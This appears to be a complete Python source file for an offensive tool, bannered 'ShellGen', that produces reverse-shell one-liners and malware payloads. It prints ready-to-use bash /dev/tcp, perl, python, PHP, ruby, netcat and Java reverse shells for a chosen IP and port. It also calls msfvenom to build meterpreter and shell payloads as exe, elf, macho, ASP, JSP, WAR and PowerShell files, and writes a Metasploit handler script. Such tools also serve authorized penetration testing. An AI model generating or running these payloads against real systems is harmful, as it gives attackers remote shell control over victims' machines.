#!/usr/bin/env python3

import shutil
import optparse
import ipaddress
import subprocess
import netifaces as ni
from colorama import Fore, Style
from optparse import OptionParser
from netifaces import AF_INET, AF_INET6, AF_LINK, AF_PACKET, AF_BRIDGE

#Checks if msfvenom is installed
def checkMsfvenom():
	if shutil.which('msfvenom') is not None:
		True
	else:
		print(Fore.RED + "\nmsfvenom not installed/found, that feature will not work." + Style.RESET_ALL)

#List of supported Shells
def list():
	print(Fore.YELLOW + """
Select by number/name:

(1) Bash
(2) Perl
(3) Python
(4) PHP
(5) Ruby
(6) Netcat
(7) Java
(8) Msfvenom""" + Style.RESET_ALL)


#Creates a handler.rc file to start a mult/handler for your msfvenom shell
def handler(ip, port, payload):
	f = open("handler.rc", "w")
	f.write("use exploit/multi/handler\n")
	f.write("set payload {}\n".format(payload))
	f.write("set lhost {}\n".format(ip))
	f.write("set lport {}\n".format(port))
	f.write("exploit\n")
	f.close()
	print(Fore.GREEN + "\nFile 'handler.rc' created. Type 'msfconsole -r handler.rc' to start the handler"+ Style.RESET_ALL)



def payloads(meterpreter, ip, port, payloadType, fileType, ext):
	
	if meterpreter == 'y':
		print(Fore.GREEN + "Generating payload: msfvenom -p {}/meterpreter/reverse_tcp LHOST={} LPORT={} -f {} -o shell.{}".format(payloadType, ip, port, fileType, ext))
		print(Style.RESET_ALL)
		subprocess.run(['msfvenom','-p',payloadType + '/meterpreter/reverse_tcp','LHOST='+ip,'LPORT='+port,'-f',fileType,'-o','shell.'+ext])
		payload = "{}/meterpreter/reverse_tcp".format(payloadType)
		handler(ip, port, payload)
	elif meterpreter == 'n':
		print(Fore.GREEN + "Generating payload: msfvenom -p {}/shell_reverse_tcp LHOST={} LPORT={} -f {} -o shell.{}".format(payloadType, ip, port, fileType, ext))
		print(Style.RESET_ALL)
		subprocess.run(['msfvenom','-p',payloadType+'/shell_reverse_tcp','LHOST='+ip,'LPORT='+port,'-f',fileType,'-o','shell.'+ext])
		payload = "{}/shell_reverse_tcp".format(payloadType)
		handler(ip, port, payload)
	else:
		print(Fore.RED + "Oh no, something went wrong..." + Style.RESET_ALL)




def msf(ip, port):
	print(Fore.YELLOW + """
#####Type#####
(1) ASP** [.asp]
(2) ASPX** [.aspx]
(3) Bash [.sh]
(4) Java [.jsp]
(5) Linux** [.elf]
(6) OSX** [.macho]
(7) Perl [.pl]
(8) PHP** [.php]
(9) Powershell** [.ps1]
(10) Python [.py]
(11) Tomcat [.jsp]
(12) Windows** [.exe]

'**' Indicates meterpreter compatibility\n""" + Style.RESET_ALL)
	try:

		choice = input(Fore.YELLOW + "Choose a shell[1-12]: " + Style.RESET_ALL)
		
		#ASP
		if choice == '1':
			ext = "asp"
			fileType = "asp"
			payloadType = "windows"

			meterpreter = input(Fore.YELLOW + "Meterpreter?[y/n]: " + Style.RESET_ALL).lower()
			if meterpreter == 'y':
				payloads(meterpreter, ip, port, payloadType, fileType, ext)
			elif meterpreter == 'n':
				payloads(meterpreter, ip, port, payloadType, fileType, ext)
			else:
				print(Fore.RED + "Oh no, that wasn't a y/n answer." + Style.RESET_ALL)
		#ASPX
		elif choice == '2':
			ext = "aspx"
			fileType = "aspx"
			payloadType = "windows"

			meterpreter = input(Fore.YELLOW + "Meterpreter?[y/n]: " + Style.RESET_ALL).lower()
			if meterpreter == 'y':
				payloads(meterpreter, ip, port, payloadType, fileType, ext)
			elif meterpreter == 'n':
				payloads(meterpreter, ip, port, payloadType, fileType, ext)
			else:
				print(Fore.RED + "Oh no, that wasn't a y/n answer." + Style.RESET_ALL)

		#Bash
		elif choice == '3':
			print(Fore.GREEN + "Generating payload: msfvenom -p cmd/unix/reverse_bash LHOST={} LPORT={} -o shell.sh".format(ip, port))
			print(Style.RESET_ALL)
			subprocess.run(['msfvenom','-p','cmd/unix/reverse_bash','LHOST='+ip,'LPORT='+port,'-o','shell.sh'])

			payload = "cmd/unix/reverse_bash"
			handler(ip, port, payload)
		
		#Java
		elif choice == '4':
			print(Fore.GREEN + "Generating payload: msfvenom -p java/jsp_shell_reverse_tcp LHOST={} LPORT={} -f raw -o shell.jsp".format(ip, port))
			print(Style.RESET_ALL)
			subprocess.run(['msfvenom','-p','java/jsp_shell_reverse_tcp','LHOST='+ip,'LPORT='+port,'-f','raw','-o','shell.jsp'])
			payload = "java/jsp_shell_reverse_tcp"
			handler(ip, port, payload)
		
		#Linux
		elif choice == '5':
			meterpreter = input(Fore.YELLOW + "Meterpreter?[y/n]: " + Style.RESET_ALL).lower()
			architecture = input(Fore.YELLOW + "Architecture?[x86/x64]: " + Style.RESET_ALL)
			ext = "elf"
			fileType = "elf"
			if architecture == 'x86':
				payloadType = 'linux/x86'
			elif architecture == 'x64':
				payloadType = 'linux/x64'
			else:
				print(Fore.RED + "Oh no, not a valid architecture" + Style.RESET_ALL)
			if meterpreter == 'y':
				payloads(meterpreter, ip, port, payloadType, fileType, ext)
			elif meterpreter == 'n':
				payloads(meterpreter, ip, port, payloadType, fileType, ext)
			else:
				print(Fore.RED + "Oh no, that wasn't a y/n answer." + Style.RESET_ALL)

		#OSX
		elif choice == '6':
			meterpreter = input(Fore.YELLOW + "Meterpreter?[y/n]: " + Style.RESET_ALL).lower()
			architecture = input(Fore.YELLOW + "Architecture?[x86/x64]: " + Style.RESET_ALL)
			ext = "macho"
			fileType = "macho"
			payloadType = "osx/" + architecture

			if meterpreter == 'y':
				if architecture == 'x86':
					print(Fore.RED + "x86 is not compatible with meterpreter on OSX, defaulting to x64" + Style.RESET_ALL)
					payloadType = "osx/x64"
					payloads(meterpreter, ip, port, payloadType, fileType, ext)
				else:
					payloads(meterpreter, ip, port, payloadType, fileType, ext)
			elif meterpreter == 'n':
				payloads(meterpreter, ip, port, payloadType, fileType, ext)
			else:
				print(Fore.RED + "Oh no, that wasn't a y/n answer." + Style.RESET_ALL)
		
		#Perl
		elif choice == '7':
			print(Fore.GREEN + "Generating payload: msfvenom -p cmd/unix/reverse_perl LHOST={} LPORT={} -f raw -o shell.pl".format(ip, port))
			print(Style.RESET_ALL)
			subprocess.run(['msfvenom','-p','cmd/unix/reverse_perl','LHOST='+ip,'LPORT='+port,'-f','raw','-o','shell.pl'])
			payload = "cmd/unix/reverse_perl"
			handler(ip, port, payload)

		#PHP
		elif choice == '8':
			meterpreter = input(Fore.YELLOW + "Meterpreter?[y/n]: " + Style.RESET_ALL).lower()
			
			if meterpreter == 'y':
				print(Fore.GREEN + "Generating payload: msfvenom -p php/meterpreter_reverse_tcp LHOST={} LPORT={} -f raw -o shell.php".format(ip, port))
				print(Style.RESET_ALL)
				subprocess.run(['msfvenom','-p','php/meterpreter_reverse_tcp','LHOST='+ip,'LPORT='+port,'-f','raw','-o','shell.php'])
				payload = "php/meterpreter_reverse_tcp"
				handler(ip, port, payload)
			elif meterpreter == 'n':
				print(Fore.GREEN + "Generating payload: msfvenom -p php/reverse_php LHOST={} LPORT={} -f raw -o shell.php".format(ip, port))
				print(Style.RESET_ALL)
				subprocess.run(['msfvenom','-p','php/reverse_php','LHOST='+ip,'LPORT='+port,'-f','raw','-o','shell.php'])
				payload = "php/reverse_tcp"
				handler(ip, port, payload)
			else:
				print(Fore.RED + "Oh no, that wasn't a y/n answer." + Style.RESET_ALL)
		
		#Powershell
		elif choice == '9':
			meterpreter = input(Fore.YELLOW + "Meterpreter?[y/n]: " + Style.RESET_ALL).lower()
			architecture = input(Fore.YELLOW + "Archictecture?[x86/x64]: " + Style.RESET_ALL)
			ext = "ps1"
			fileType = "psh"

			if architecture == 'x86':
				payloadType = "windows"
			elif architecture == "x64":
				payloadType = "windows/x64"
			else:
				print(Fore.RED + "Oh no, not a valid architecture." + Style.RESET_ALL)
			
			if meterpreter == 'y':
				payloads(meterpreter, ip, port, payloadType, fileType, ext)
			elif meterpreter == 'n':
				payloads(meterpreter, ip, port, payloadType, fileType, ext)
			else:
				print(Fore.RED + "Oh no, that wasn't a y/n answer." + Style.RESET_ALL)
		
		#Python
		elif choice == '10':
			system = input(Fore.YELLOW + "Windows or Linux?[w/l]: " + Style.RESET_ALL).lower()
			if system == 'w':
				print(Fore.GREEN + "Generating payload: msfvenom -p windows/shell_reverse_tcp LHOST={} LPORT={}  -f python -o shell.py".format(ip, port))
				print(Style.RESET_ALL)
				subprocess.run(['msfvenom','-p','windows/shell_reverse_tcp','LHOST='+ip,'LPORT='+port,'-f','python','-o','shell.py'])
				payload = "windows/shell_reverse_tcp"
				handler(ip, port, payload)
			elif system == 'l':
				print(Fore.GREEN + "Generating payload: msfvenom -p cmd/unix/reverse_python LHOST={} LPORT={} -f raw -o reverse.py".format(ip, port))
				print(Style.RESET_ALL)
				subprocess.run(['msfvenom','-p','cmd/unix/reverse_python','LHOST='+ip,'LPORT='+port,'-f','raw','-o','shell.py'])
				payload = "cmd/unix/reverse_python"
				handler(ip, port, payload)
			else:
				print(Fore.RED + "Oh no, that wasn't a y/n answer." + Style.RESET_ALL)
		
		#Tomcat
		elif choice == '11':
			print(Fore.GREEN + "Generating payload: msfvenom -p java/jsp_shell_reverse_tcp LHOST={} LPORT={} -f war -o shell.war".format(ip, port))
			print(Style.RESET_ALL)
			subprocess.run(['msfvenom','-p','java/jsp_shell_reverse_tcp','LHOST='+ip,'LPORT='+port,'-f','war','-o','shell.war'])
			payload = "java/jsp_shell_reverse_tcp"
			handler(ip, port, payload)
		
		#Windows
		elif choice == '12':
			meterpreter = input(Fore.YELLOW + "Meterpreter?[y/n]: " + Style.RESET_ALL).lower()
			architecture = input(Fore.YELLOW + "Architecture?[x86/x64]: " + Style.RESET_ALL)
			ext = "exe"
			fileType = "exe"
			payloadType = "windows"

			if meterpreter == 'y':
				if architecture == 'x86':
					payloads(meterpreter, ip, port, payloadType, fileType, ext)

				else:
					payloadType = "windows/x64"
					payloads(meterpreter, ip, port, payloadType, fileType, ext)
			elif meterpreter == 'n':
				print(Fore.GREEN + "Generating Payload: msfvenom -p windows/shell/reverse_tcp LHOST={} LPORT={} -f exe -o shell.exe".format(ip, port))
				print(Style.RESET_ALL)
				subprocess.run(['msfvenom','-p','windows/shell/reverse_tcp','LHOST='+ip,'LPORT='+port,'-f','exe','-o','shell.exe'])
				payload = "windows/shell/reverse_tcp"
				handler(ip, port, payload)
			else:
				print(Fore.RED + "Oh no, that wasn't a y/n answer." + Style.RESET_ALL)
		else:
			print(Fore.RED + "Oh no, not a valid option" + Style.RESET_ALL)
			
	except KeyboardInterrupt:
		print(Fore.RED + "\n\nGoodbye Now\n" + Style.RESET_ALL)
	except FileNotFoundError:
		print(Fore.RED + "\nmsfvenom not installed/found, can't use this option.\n" + Style.RESET_ALL)


def shells(ip, port, shell):
	bash1 = Fore.GREEN + "bash -i >& /dev/tcp/{}/{} 0>&1\n\n".format(ip, port) + Style.RESET_ALL 
	bash2 = Fore.GREEN + "0<&196;exec 196<>/dev/tcp/{}/{}; sh <&196 >&196 2>&196\n".format(ip, port) + Style.RESET_ALL
	perl = Fore.GREEN + 'perl -e \'use Socket;$i="{}";$p={};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\''.format(ip, port) + Style.RESET_ALL
	python = Fore.GREEN + "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{}\",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'".format(ip, port) + Style.RESET_ALL
	php1 = Fore.GREEN + "php -r '$sock=fsockopen(\"{}\",{});exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n\n".format(ip, port) + Style.RESET_ALL
	php2 = Fore.GREEN + "<?php shell_exec(\"/bin/bash -c 'bash -i > /dev/tcp/{}/{} 0>&1'\"); ?>\n".format(ip, port) + Style.RESET_ALL
	ruby = Fore.GREEN + "ruby -rsocket -e'f=TCPSocket.open(\"{}\"{}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'".format(ip, port) + Style.RESET_ALL
	netcat1 = Fore.GREEN + "nc -e /bin/sh {} {}\n\n".format(ip, port) + Style.RESET_ALL
	netcat2 = Fore.GREEN + "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f\n\n".format(ip, port) + Style.RESET_ALL
	netcat3 = Fore.GREEN + "ncat {} {} -e /bin/bash\n".format(ip, port) + Style.RESET_ALL
	java = Fore.GREEN + "r = Runtime.getRuntime()\np = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{}/{};cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[])\np.waitFor()\"".format(ip, port) + Style.RESET_ALL
	

	listShell = {
		**dict.fromkeys(['1', 'sh', 'bash'], bash1 + bash2),
		**dict.fromkeys(['2', 'pl', 'perl'], perl),
		**dict.fromkeys(['3', 'py', 'python'], python),
		**dict.fromkeys(['4', 'php'], php1 + php2),
		**dict.fromkeys(['5', 'rb', 'ruby'], ruby),
		**dict.fromkeys(['6', 'nc', 'netcat'], netcat1 + netcat2 + netcat3),
		**dict.fromkeys(['7', 'java'], java),

	}
	if shell == '8' or shell == 'msf' or shell == 'msfvenom':
		msf(ip, port)
	else:
		print(listShell.get(shell, "Invalid Choice"))	

def header():
	print(Fore.BLUE + """
 ___  _   _  ____  __    __    ___  ____  _  _ 
/ __)( )_( )( ___)(  )  (  )  / __)( ___)( \\( )
\__ \ ) _ (  )__)  )(__  )(__( (_-. )__)  )  ( 
(___/(_) (_)(____)(____)(____)\___/(____)(_)\_)\n""" + Style.RESET_ALL)


def interfaces():
	
	print(Fore.YELLOW + "\tAvailable Interfaces" + Style.RESET_ALL)
	subprocess.Popen("ip -f inet -br addr show | sed 's/@...../      /g'; echo ''", stdin=subprocess.PIPE, shell=True)

def getInterfaceIp(interface, port, shell):
	try:
		ip = ni.ifaddresses(interface)[AF_INET][0]['addr']
		shells(ip, port, shell)
	except ValueError:
		print("Oh no, not a valid interface name.")

def main():
	checkMsfvenom()
	header()
	print(Fore.YELLOW)
	parser = OptionParser("Usage: %prog -i <ip/interface name> -p <port> -s <shell>" + Style.RESET_ALL)
	parser.add_option("-i", dest="ip", type="string", help="Specify ip address/interface name (REQUIRED)")
	parser.add_option("-p", dest="port", type="int", default=9999, help="Specify listen port (Default: 9999)")
	parser.add_option("-s", dest="shell", type="string", help="Specify type of shell (REQUIRED)")
	parser.add_option("-l", dest="list", action="store_true", help="list all shell choices")
	(options, args) = parser.parse_args()
	if options.list == True:
		list()
		
	elif options.ip is None or options.shell is None:
		parser.print_help()
		print("\n")
		interfaces()
		print(Style.RESET_ALL)
	else:
		ip = options.ip
		port = str(options.port)
		shell = options.shell.lower()
		try:
			ipaddress.ip_address(ip)
			shells(ip, port, shell)
		except ValueError: 
			getInterfaceIp(ip, port, shell)

main() 
